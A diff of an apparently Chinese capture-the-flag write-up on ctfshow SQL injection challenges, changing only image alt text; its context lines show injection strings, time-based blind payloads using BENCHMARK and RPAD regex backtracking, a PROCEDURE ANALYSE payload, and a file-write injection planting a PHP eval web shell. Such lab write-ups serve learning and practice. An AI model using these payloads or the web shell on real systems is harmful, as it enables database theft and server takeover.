@@ -244,7 +244,7 @@ select id,username,password from ctfshow_user where username !='flag' and id = '
 
 说实话我没有看太懂，然后在我们SU的discord里面问了问
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 就是这个样子，输入`-1'||username='flag`
 
@@ -500,7 +500,7 @@ for i in range(1, 50):
 
 ## web187
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 这不就把`'`变出来了`ffifdyop`
 
@@ -988,7 +988,7 @@ while True:
 
 `sleep`没了，用`benchmark`绕过一下就好了`BENCHMARK(25000000, SHA2('test', 512))`这样子差不多就是5s
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 ```python
 import requests
@@ -1047,7 +1047,7 @@ while True:
 
 `RPAD(1, 999999, 'a')` 会创建一个包含1个"1"和999998个"a"的字符串，`concat`连接巨大字符串，并且正则表达式是贪婪的，所以回溯就会很久
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 ```python
 import requests
@@ -1230,7 +1230,7 @@ SELECT User FROM user WHERE Host >0 ORDER BY Host LIMIT 1,1 procedure analyse(ex
 SELECT User FROM user WHERE Host >0 ORDER BY Host LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000000,SHA1(1)),1))))),1);
 ```
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 打入即可
 
@@ -1497,7 +1497,7 @@ password=-1',username=(select flagas from flaga)#&username=
 
 有个槽点就是这个东西只能慢慢的去看回显好像
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 ## web232
 
@@ -1710,7 +1710,7 @@ filename=1.txt' lines starting by '<?= eval($_POST[1]);?>'#
 
 访问`/demp/`即可getshell
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 ## web244
 
